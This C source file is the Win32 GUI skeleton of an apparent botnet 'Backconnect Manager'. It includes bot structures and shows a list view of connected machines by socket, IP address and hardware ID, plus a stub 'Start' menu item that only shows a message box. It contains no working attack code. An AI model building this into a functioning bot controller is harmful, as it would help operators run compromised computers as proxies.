#include "..\common\bot_structs.h"

#include <Commctrl.h>

#include "..\common\api.h"
#include "..\common\mem.h"
#include "..\common\socket.h"

#pragma comment(lib, "Comctl32.lib")

bot_t bot;

#define IDM_MENU_START 1

//ListView containing connections and information about connections
HWND m_hLvConnections;
HINSTANCE m_hInstance;

static void _InitListViewColumns(void)
{
	LVCOLUMNW lvc;
	DWORD i;
	static LPWSTR pwzColumns[] = { L"Socket:", L"IP Address(v4):", L"HWID:", NULL };

	for(i = 0; i < 3; i++)
	{
		memzero(&lvc, sizeof(LVCOLUMNW));
		lvc.iSubItem = i;
		lvc.pszText = pwzColumns[i];
		lvc.cx = 100;
		lvc.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT | LVCF_SUBITEM;

		ListView_InsertColumn(m_hLvConnections, i, &lvc);
	}
}

static void _CreateConnectionListView(HWND hwnd)
{
	RECT rcClient;
	INITCOMMONCONTROLSEX iccex;

	iccex.dwICC = ICC_LISTVIEW_CLASSES;
	InitCommonControlsEx(&iccex);

	GetClientRect(hwnd, &rcClient);

	m_hLvConnections = CreateWindowW(WC_LISTVIEWW, L"", WS_VISIBLE | WS_CHILD | LVS_REPORT, 0, 0, rcClient.right - rcClient.left, rcClient.bottom - rcClient.top, hwnd, 0, m_hInstance, NULL); 

	_InitListViewColumns();
}

static void _CreateMenus(HWND hwnd)
{
	HMENU hMenuBar, hMenu;

	hMenuBar = CreateMenu();
	hMenu = CreateMenu();

	AppendMenuW(hMenu, MF_STRING, IDM_MENU_START, L"&Start");

	AppendMenuW(hMenuBar, MF_POPUP, (UINT_PTR)hMenu, L"&Menu");
	SetMenu(hwnd, hMenuBar);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, 
    WPARAM wParam, LPARAM lParam)
{
  switch(msg)  
  {
  case WM_CREATE:
	  {
		_CreateMenus(hwnd);
		_CreateConnectionListView(hwnd);
	  }
	  break;
  case WM_COMMAND:
	  {
		switch(LOWORD(wParam))
		{
		case IDM_MENU_START:
			{
				MessageBoxW(0, L"Create server was clicked.", NULL, 0);
			}
			break;
		default:break;
		}
	  }
	  break;
    case WM_DESTROY:
      PostQuitMessage(0);
      return 0;      
  }

  return DefWindowProcW(hwnd, msg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
               PWSTR szCmdLine, int CmdShow)
{
	MSG msg;
	HWND hwnd;
	WNDCLASSW wc;

	if(!InitializeAPI())
		return 0;

	Socket_Init();

	m_hInstance = hInstance;

	memzero(&wc, sizeof(WNDCLASSW));
	wc.style = CS_HREDRAW | CS_VREDRAW;
	wc.lpszClassName = L"Main Window";
	wc.hInstance = hInstance;
	wc.hbrBackground = GetSysColorBrush(COLOR_3DFACE);
	wc.lpszMenuName = NULL;
	wc.lpfnWndProc = WndProc;
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);

	RegisterClassW(&wc);

	hwnd = CreateWindowW(wc.lpszClassName, L"Backconnect Manager", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 100, 100, 350, 350, NULL, NULL, hInstance, NULL);
	
	ShowWindow(hwnd, CmdShow);
	UpdateWindow(hwnd);

	while(GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	Socket_Uninit();

	
	return msg.wParam;
}